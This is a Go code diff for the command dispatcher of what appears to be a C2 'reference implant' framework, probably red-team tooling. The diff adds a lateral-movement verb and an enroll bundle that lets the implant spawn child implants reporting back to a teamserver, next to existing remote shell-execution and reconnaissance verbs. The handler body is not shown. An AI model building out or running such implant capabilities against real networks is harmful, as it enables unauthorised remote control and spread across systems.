@@ -1,7 +1,8 @@
 // Package exec dispatches the capability verbs the reference implant
-// advertises (architecture.md Sec 10): the shell.exec core verb and the
-// recon.portscan / recon.hostenum / recon.service recon verbs. The runner is
-// the dispatch point future verbs (file.push, probe.read, ...) extend.
+// advertises (architecture.md Sec 10): the shell.exec core verb, the
+// recon.portscan / recon.hostenum / recon.service recon verbs, and the
+// lateral.move child-derivation verb. The runner is the dispatch point future
+// verbs (file.push, probe.read, ...) extend.
 //
 // This is a benign reference runner: it shells out to the platform shell for the
 // one core verb and reports output. It performs no evasion, no obfuscation, and
@@ -10,27 +11,57 @@ package exec
 
 import (
 	"context"
+	"crypto/x509"
 	"io"
 	"log"
 	"os/exec"
 	"runtime"
 
+	"github.com/cw/rod/implant/internal/c2"
 	"github.com/cw/rod/implant/rodpb"
 )
+
+// EnrollBundle carries the inputs the lateral.move handler needs to derive a
+// child implant that enrolls back against the same teamserver (architecture.md
+// Sec 10.1). The parent's own stager token is already spent at this implant's
+// enroll, so the child token arrives in the lateral.move arguments; the bundle
+// here is the enroll endpoint, CA pin, transport profile, and the parent's own
+// implant id (named as the child's parent). A zero-value bundle (empty URL)
+// leaves derivation disabled.
+type EnrollBundle struct {
+	URL      string
+	CAs      *x509.CertPool
+	Profile  c2.TransportProfile
+	ParentID string
+}
 
 // Runner dispatches capability verbs. It is safe for concurrent use: each
 // Dispatch call runs an independent command.
 type Runner struct {
-	log *log.Logger
+	log    *log.Logger
+	enroll *EnrollBundle
 }
 
-// NewRunner builds a Runner. logger may be nil (a no-op logger is used then);
+// NewRunner builds a Runner without child-derivation inputs (lateral.move
+// reports it is unavailable). logger may be nil (a no-op logger is used then);
 // the param is named to avoid shadowing the standard log package inside the body.
 func NewRunner(logger *log.Logger) *Runner {
 	if logger == nil {
 		logger = log.New(io.Discard, "", 0)
 	}
 	return &Runner{log: logger}
+}
+
+// NewRunnerWithEnroll builds a Runner whose lateral.move handler derives a child
+// against the given enroll bundle (architecture.md Sec 10.1). A bundle with an
+// empty URL is treated as "derivation disabled" so the handler fails cleanly
+// rather than enrolling against an empty endpoint.
+func NewRunnerWithEnroll(enroll EnrollBundle, logger *log.Logger) *Runner {
+	r := NewRunner(logger)
+	if enroll.URL != "" {
+		r.enroll = &enroll
+	}
+	return r
 }
 
 // Dispatch runs verb against arguments and returns the wire outcome plus the
@@ -46,6 +77,8 @@ func (r *Runner) Dispatch(ctx context.Context, verb, arguments string) (rodpb.Ta
 		return r.hostEnum(ctx, arguments)
 	case "recon.service":
 		return r.serviceProbe(ctx, arguments)
+	case "lateral.move":
+		return r.lateralMove(ctx, arguments)
 	default:
 		r.log.Printf("unknown verb: %s", verb)
 		return rodpb.TaskOutcome_TASK_OUTCOME_FAILED, "unknown verb: " + verb
